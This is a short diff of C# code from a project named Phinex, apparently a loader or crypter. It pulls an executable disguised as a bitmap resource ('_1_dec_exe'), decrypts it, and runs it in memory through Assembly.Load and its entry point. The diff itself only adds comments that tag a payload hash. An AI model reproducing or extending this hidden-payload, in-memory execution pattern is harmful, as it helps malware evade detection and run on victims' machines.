@@ -27,7 +27,7 @@ namespace Phinex
 
         private static Bitmap getBitmap()
         {
-            Bitmap myBmp = Phinex.Properties.Resources._1_dec_exe;
+            Bitmap myBmp = Phinex.Properties.Resources._1_dec_exe;		//payload : 073a97a88e7a1512e1a7bbadcab962f4dcedd3f5
             return myBmp;
         }
 
@@ -70,7 +70,8 @@ namespace Phinex
             //bw.Close();
             //fs.Close();
             //MessageBox.Show("Decrypted file: payload.bin", "Decrypted!");
-
+			//payload : 073a97a88e7a1512e1a7bbadcab962f4dcedd3f5
+			
             Assembly assembly = Assembly.Load(rawAssembly);
             MethodInfo entryPoint = assembly.EntryPoint;
             object obj = assembly.CreateInstance(entryPoint.Name);
